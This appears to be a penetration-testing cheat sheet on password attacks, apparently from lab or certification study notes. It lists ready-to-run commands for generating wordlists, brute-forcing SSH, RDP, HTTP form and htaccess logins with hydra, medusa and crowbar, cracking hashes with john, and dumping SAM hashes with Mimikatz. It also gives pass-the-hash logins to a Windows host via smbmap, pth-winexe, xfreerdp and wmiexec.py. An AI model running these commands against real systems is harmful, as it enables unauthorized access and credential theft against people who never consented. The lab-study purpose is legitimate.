# Password Attack

## Generate Wordlists

* `/usr/share/wordlists`

* `/usr/share/seclists`

### crunch

=== "Generation"

	``` bash
	crunch 5 5 -t ,@@^% -o password.txt
	```

	``` bash
	crunch 10 10 0123456789 -t 2343@@@@@@ -o passwd.txt
	```

	Using `/usr/share/crunch/charset.lst`

	``` bash
	crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o crunch.txt
	```

=== "crunch options"

	|Placeholder | Character Translation|
	|--|--|
	|@ | Lower case alpha characters|
	|, | Upper case alpha characters|
	|% | Numeric characters|
	|^ | Special characters including space|

### cewl

``` bash
cewl $url -m 6 -w wordlists.txt
```

### john.conf Rules

`/etc/john/john.conf` > `[List.Rules:Wordlist]`

``` bash
john --wordlist=passwd.txt --rules --stdout > pass-rules.txt
```

## Common Service

### HTTP htaccess Attack

[How To Set Up Password Authentication with Apache on Ubuntu 14.04](https://www.digitalocean.com/community/tutorials/how-to-set-up-password-authentication-with-apache-on-ubuntu-14-04)

``` bash
medusa -h 127.0.0.1 -u kali -P ./pass.txt -M http -m DIR:/
```

### RDP Attack

``` bash
crowbar -b rdp -s 192.168.11.135/32 -u windows_10_1903_x64 -C ./pass.txt -n 4
```

### SSH Attack

``` bash
hydra -l kali -P ./pass.txt ssh://127.0.0.1
```

### HTTP POST Attack

``` bash
hydra -l admin -P ./pass.txt 192.168.11.135 http-form-post "/admin.php:user=admin&pass=^PASS^:INVALID CREDENTIALS" -vV -f
```

## Leveraging Password Hashes

### Retrieving Password Hashes

[How to identify hash types](https://miloserdov.org/?p=1254)

[Generate password](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation) for new user

``` bash
openssl passwd -1 -salt hades leecybersec > hash.txt
```

``` bash
hashid -m hash.txt
```

``` bash
john --wordlist=./pass.txt hash.txt
```

### Passing the Hash in Windows

[Intro to Windows hashes](https://chryzsh.gitbooks.io/darthsidious/content/getting-started/intro-to-windows-hashes.html)

Mimikatz.exe

``` bash
privilege::debug
token::elevate
lsadump::sam
```

[Pass-The-Hash](https://www.puckiestyle.nl/pass-the-hash)

Using smbmap

List directory at folder Desktop

``` bash
smbmap -H 192.168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' -r 'Users\windows_10_1903_x64\Desktop'
```

Download file `41542.c` in Windows 10

``` bash
smbmap -H 192.168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' --download 'Users\windows_10_1903_x64\Desktop\41542.c'
```

pth-winexe

``` bash
pth-winexe -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd
```

pth-wmis

``` bash
pth-wmis -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd
```

xfreerdp

``` bash
xfreerdp /v:192.168.11.135 /u:windows_10_1903_x64 /pth:68bdacb06923faed9dc32661308f594e
```

wmiexec.py

``` bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e windows_10_1903_x64@192.168.11.135
```